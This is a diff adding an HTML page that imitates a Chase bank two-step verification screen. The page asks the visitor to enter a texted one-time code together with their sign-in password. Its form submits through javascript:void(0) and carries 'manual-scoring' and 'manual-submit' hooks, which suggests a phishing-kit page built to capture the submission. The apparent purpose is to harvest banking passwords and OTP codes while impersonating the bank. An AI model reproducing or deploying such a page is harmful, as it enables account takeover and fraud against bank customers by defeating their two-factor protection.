@@ -1,0 +1,146 @@
+<div id="body">
+    <div id="logonApp">
+        <div class="homepage">
+            <div id="advertisenativeapp"></div>
+            <div aria-hidden="true" aria-labelledby="site-messages-heading" class="toggle-aria-hidden" id="sitemessage"
+                 role="region"></div>
+            <div class="logon-container" id="container">
+                <header class="toggle-aria-hidden logon-blue-header" data-has-view="true" id="logon-summary-menu">
+                    <div class="logon header jpui transparent navigation bar" data-component-name="ROOT/SITE/logon/logonSummaryMenu|logonSummaryMenuComponent|LOGON_SUMMARY_MENU|ecd10206-7bfa-4a2a-bc19-52c38b9e97af"
+                         data-is-view="true">
+                        <a href="#" id="logoHomepageLink">
+                            <div>
+                                <div class="chase logo"></div>
+                            </div>
+                            <span class="util accessible-text">Chase.com homepage</span></a></div>
+                </header>
+                <main data-has-view="true" id="logon-content">
+                    <div class="msd password-reset" data-component-name="ROOT/SITE/logon/extra/mfa|logonIdentification|LOGON_IDENTIFICATION|b384ed58-2030-475e-a8d8-f94d1457ed62" data-is-view="true"
+                         id="simpler-auth">
+                        <div class="container">
+                            <div class="row jpui primary panel">
+                                <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
+                                    <div class="row jpui panel body">
+                                        <div class="col-xs-12 col-sm-10 col-sm-offset-1">
+                                            <div class="row">
+                                                <div class="col-xs-12"><h1 class="progress-bar-label"
+                                                                           id="progressBarSimplerAuthCode"
+                                                                           tabindex="-1">Get verified <span
+                                                        class="util high-contrast">Step 2 of 2</span></h1></div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col-xs-12">
+                                                    <div class="jpui progress rectangles bar" data-progress="100"
+                                                         id="progress">
+                                                        <div class="bar fill" id="progress-bar"></div>
+                                                        <span class="util accessible-text"
+                                                              id="accessible-bar-progress"></span></div>
+                                                </div>
+                                            </div>
+                                            <form action="javascript:void(0);" autocomplete="off" id="mfa-submit-form"
+                                                  method="POST" novalidate=""><h3
+                                                    class="heading header-text">We sent you a text message.</h3>
+                                                <p class="your-temporary-code">Please tell us your one-time code, along
+                                                    with your sign in password and choose "Next."</p>
+                                                <div class="inside-container">
+                                                    <div class="row"><label class="jpui label auth-custom-label"
+                                                                            for="otpcode_input-input-field"><span
+                                                            class="accessible-text hidden"></span>One-time code</label>
+                                                        <div class="col-xs-12 col-sm-5">
+                                                            <div class="auth-custom-input" id="otpcode_input"><input
+                                                                    class="jpui input auth-custom-input" data-validate="identificationCode"
+                                                                    format="" id="otpcode_input-input-field"
+                                                                    min="0" name="identificationCode" placeholder=""
+                                                                    required="" type="text"
+                                                                    value="" data-manual-scoring="unknown"></div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="row"><label class="jpui label auth-custom-label error"
+                                                                            for="password_input-input-field"><span
+                                                            class="util accessible-text errorAdaText">Error:</span><span
+                                                            class="accessible-text hidden" id="pwlabel"></span>Password</label>
+                                                        <div class="col-xs-12 col-sm-5">
+                                                            <div class="auth-custom-input" id="password_input"><input
+                                                                    class="jpui input auth-custom-input clientSideError"
+                                                                    data-validate="password"
+                                                                    format="" id="password_input-input-field"
+                                                                    min="0" name="identificationCode" placeholder=""
+                                                                    required="" type="password" value="" data-manual-scoring="password">
+                                                                <div class="password-error-bubble error-bubble util accessible-text"
+                                                                     id="error-bubble"
+                                                                     style="width: 100%; float: left; position: relative !important; margin-top: -40px;"
+                                                                     tabindex="-1"><a
+                                                                        aria-labelledby="password-error-bubble-label-content"
+                                                                        class="jpui error pointing below noborder attached label"
+                                                                        data-arrowposition="50"
+                                                                        href="javascript:void(0);" id="password-error-bubble"
+                                                                        tabindex="0"><span
+                                                                        class="label-outline"
+                                                                        id="password-error-bubble-label-content">Please enter a valid password.</span></a>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <h3 class="didn-t-get-our-message">Didn't get a code?</h3>
+                                                    <div class="identification-code-received-message"><span
+                                                            class="jpui link"
+                                                            id="requestNewIdentificationCode-link-wrapper"><a
+                                                            aria-label=" Let's try it again " class="link-anchor"
+                                                            href="javascript:void(0);"
+                                                            id="requestNewIdentificationCode">Let's try it again<i
+                                                            aria-hidden="true"
+                                                            class="jpui progressright icon end-icon"
+                                                            id="requestNewIdentificationCode-endIcon"></i></a></span></div>
+                                                </div>
+                                                <div class="button-container row hide-xs show-sm">
+                                                    <div class="col-xs-12 col-sm-3 col-sm-offset-6">
+                                                        <button class="jpui button focus fluid cancel" id="exitIdentification-sm"
+                                                                type="button"><span
+                                                                class="label">Cancel</span></button>
+                                                    </div>
+                                                    <div class="col-xs-12 col-sm-3">
+                                                        <button class="jpui button focus fluid primary" id="log_on_to_landing_page-sm"
+                                                                type="submit" data-manual-submit><span
+                                                                class="label">Next</span></button>
+                                                    </div>
+                                                </div>
+                                                <div class="button-container row hide-sm">
+                                                    <div class="col-xs-12 col-sm-3 col-sm-push-9">
+                                                        <button class="jpui button focus fluid primary" id="log_on_to_landing_page"
+                                                                type="submit" data-manual-submit><span
+                                                                class="label">Next</span></button>
+                                                    </div>
+                                                    <div class="col-xs-12 col-sm-3 col-sm-push-3">
+                                                        <button class="jpui button focus fluid cancel" id="exitIdentification"
+                                                                type="button"><span
+                                                                class="label">Cancel</span></button>
+                                                    </div>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <div id="banner"></div>
+            <footer class="logon-footer" id="logon-footer"></footer>
+        </div>
+        <div id="languageSupportDisclaimer"></div>
+        <div id="overlay"></div>
+        <div class="overlay"></div>
+        <div id="signoutModal"></div>
+        <div id="siteExitWarning"></div>
+        <div id="serviceErrorModal"></div>
+        <div id="sessionTimeoutModal"></div>
+    </div>
+</div>
+<div id="root"></div>
+
+
+<div id="single-spa-application:@cxoplatform/base-app"></div>
+<div display="none" id="arcotuserdataDiv" style="display: none;"></div>
+<div arcottest_userdata="1691060877351" data-is-view="true" display="none" id="arcotuserdataDiv"
+     style="display: none;"></div>
